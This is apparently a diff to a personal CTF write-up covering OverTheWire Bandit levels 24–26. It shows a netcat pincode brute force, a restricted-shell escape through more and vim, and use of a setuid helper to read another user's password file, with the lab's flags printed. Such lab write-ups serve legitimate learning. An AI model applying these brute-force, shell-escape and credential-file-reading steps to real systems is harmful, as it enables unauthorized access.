@@ -515,4 +515,90 @@ Had to look this one up--I got stuck on a silent permissions error
 A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 
 ```
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+echo 1234 | nc localhost 30002
+> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Fail! You did not supply enough data. Try again.
+
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234" | nc localhost 30002
+> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
 ```
+
+FLAG: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+I wrote a few different iterations of bash scripts that would loop through the numbers and submit them to the daemon. Unfortunately the daemon is slow to timeout, and submitting  many requests at a time seems to overwhelm it--at least the way I was doing it.
+
+The following was the best solution I found online:
+
+```
+echo "" > pins && for i in {0000..9999}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pins; done && cat pins | nc localhost 30002
+```
+What this does is load up all the pins, correctly formatted, into a file. Then it submits that file to the daemon.
+
+I like this approach. It kind of reminds me of creating chips for Nand2Tetris, where I would calculate both possible results of a branch before selecting which path to go down.
+
+## Level 25
+
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+```
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+cat /etc/shells
+> # /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/screen
+/usr/bin/tmux
+/usr/bin/showtext
+
+cat /etc/passwd | grep 26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+ls
+> bandit26.sshkey
+
+ssh bandit26@localhost -i bandit26.sshkey -t "tmux"
+> (no dice)
+
+cat /usr/bin/showtext
+> #!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+(minimize window very very small so that more would require you to scroll)
+(hit v to open up vim)
+Now you can open files with vim!
+
+:e /etc/bandit_pass/bandit26
+```
+
+FLAG: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+This one was totally bizarre and [this writeup](https://medium.com/@coturnix97/overthewires-bandit-25-26-shell-355d78fd2f4d) was useful.
+
+The takeaway is that utils can be used to hop to other utils. `more` can open `vim` which can open a `shell` which is not the shell that the user's default.
+
+## Level 26
+
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+```
+./bandit27-do
+> Run a command as another user.
+  Example: ./bandit27-do id
+
+./bandit27-do whoami
+> bandit27 (I am actually bandit 26)
+
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
+
+FLAG: 3ba3118a22e93127a4ed485be72ef5ea
+
+Note to self: try running a file if it's highlighted in red 🤦‍♀️
